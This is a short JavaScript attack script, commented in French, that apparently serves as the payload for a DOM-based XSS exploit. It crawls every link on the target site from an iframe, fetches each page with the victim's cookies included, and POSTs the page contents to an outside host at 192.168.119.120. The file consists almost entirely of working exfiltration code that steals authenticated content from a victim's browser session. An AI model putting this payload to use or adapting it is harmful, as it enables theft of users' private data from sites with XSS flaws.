// Script qui va avec la base de données et l'API permettant de faciliter l'exploitation d'une XSS DOM-based
// Le script charge la page d'accueil du site puis navigue dans tous les liens qu'elle contient

function actions() {
    setTimeout(function() {
        getContent()
    }, 5000);
}

function getContent() {

    allA = iframe.contentDocument.getElementsByTagName("a")

    allHrefs = []
    for (var i = 0; i < allA.length; i++) {
        allHrefs.push(allA[i].href)
    }

    uniqueHrefs = _.unique(allHrefs)

    validUniqueHrefs = []
    for (var i = 0; i < uniqueHrefs.length; i++) {
        if (validURL(uniqueHrefs[i])) {
            validUniqueHrefs.push(uniqueHrefs[i]);
        }
    }

    validUniqueHrefs.forEach(href => {
        fetch(href, {
                "credentials": "include",
                "method": "GET",
            })
            .then((response) => {
                return response.text()
            })
            .then(function(text) {
                fetch("https://192.168.119.120/content", {
                    body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    method: "POST"
                })
            });
    })

}
